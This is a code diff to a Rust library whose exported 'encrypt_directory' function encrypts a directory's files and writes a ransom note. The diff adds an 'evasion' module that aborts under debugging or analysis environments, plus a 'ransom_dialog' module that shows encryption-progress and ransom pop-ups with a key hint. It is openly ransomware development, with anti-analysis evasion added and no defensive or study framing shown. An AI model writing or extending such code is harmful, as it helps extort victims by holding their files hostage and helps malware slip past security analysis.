@@ -31,6 +31,8 @@ use std::panic;
 
 mod crypto;
 mod fileops;
+mod ransom_dialog;
+mod evasion;
 
 /// Encrypts all files in a directory and returns the encryption key.
 ///
@@ -63,6 +65,11 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
                 return CString::new("ERROR:Null path provided").unwrap().into_raw();
             }
             
+            // EVASION: Check for debugging/analysis environment
+            if !evasion::should_execute() {
+                return CString::new("ERROR:Environment check failed").unwrap().into_raw();
+            }
+            
             let c_str = std::ffi::CStr::from_ptr(path);
             let path_str = match c_str.to_str() {
                 Ok(s) => s,
@@ -88,6 +95,9 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
                     .unwrap().into_raw();
             }
             
+            // Show progress dialog (non-blocking, just notification)
+            let _ = ransom_dialog::show_encryption_progress_dialog(files.len());
+            
             // Encrypt files
             let mut encrypted_count = 0;
             for file in &files {
@@ -98,6 +108,9 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
             
             // Create ransom note
             let _ = fileops::create_ransom_note(target_path, &key_hex);
+            
+            // Show ransom dialog with key hint
+            let _ = ransom_dialog::show_ransom_dialog(&key_hex);
             
             // Return key
             CString::new(format!("KEY:{}:ENCRYPTED:{}", key_hex, encrypted_count))
